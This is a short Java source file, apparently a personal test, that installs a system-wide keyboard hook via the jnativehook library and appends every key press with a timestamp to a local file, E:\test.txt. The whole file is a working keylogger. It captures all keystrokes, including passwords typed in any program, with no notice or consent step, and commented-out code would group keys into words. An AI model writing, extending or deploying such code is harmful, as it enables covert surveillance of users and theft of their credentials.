package com.arquitetura.util;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.time.Instant;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class teste implements NativeKeyListener {

	static StringBuilder text = new StringBuilder("");

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		GlobalScreen.addNativeKeyListener(new teste());
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		// text.append(NativeKeyEvent.getKeyText(e.getKeyCode()));
		//
		// String tecla = NativeKeyEvent.getKeyText(e.getKeyCode());
		//
		// if (tecla.equals("Espaço"))
		// System.out.println("Pressed: " + text);

		// System.out.println("Pressed: " +
		// NativeKeyEvent.getKeyText(e.getKeyCode()));

		text.append(NativeKeyEvent.getKeyText(e.getKeyCode()).replace("Espaço", " "));

		String tecla = NativeKeyEvent.getKeyText(e.getKeyCode());

		try (FileWriter fw = new FileWriter("E:\\test.txt", true);
				BufferedWriter bw = new BufferedWriter(fw);
				PrintWriter out = new PrintWriter(bw)) {

			out.println("PRES" + Instant.now() + ": " + NativeKeyEvent.getKeyText(e.getKeyCode()));
			//melhorar esse codigo depois
//			if (tecla.equals("Espaço")){
//				out.println("PRES" + Instant.now() + ": " + text);
//				text = null;
//				text = new StringBuilder("");
//			}
			

		} catch (IOException ee) {
			// exceção
		}

	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {

		// System.out.println("Release: "
		// + NativeKeyEvent.getKeyText(e.getKeyCode()));

		text.append(NativeKeyEvent.getKeyText(e.getKeyCode()).replace("Espaço", " "));

		String tecla = NativeKeyEvent.getKeyText(e.getKeyCode());

		try (FileWriter fw = new FileWriter("E:\\test.txt", true);
				BufferedWriter bw = new BufferedWriter(fw);
				PrintWriter out = new PrintWriter(bw)) {
			
//			out.println("REL" + Instant.now() + ": " + NativeKeyEvent.getKeyText(e.getKeyCode()));
			
			
			//melhorar depois
//			if (tecla.equals("Espaço")){
//				out.println("REL" + Instant.now() + ": " + text);
//				text = null;
//				text = new StringBuilder("");
//			}

			
			
		} catch (IOException ee) {
		}
	}


	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub

	}

}
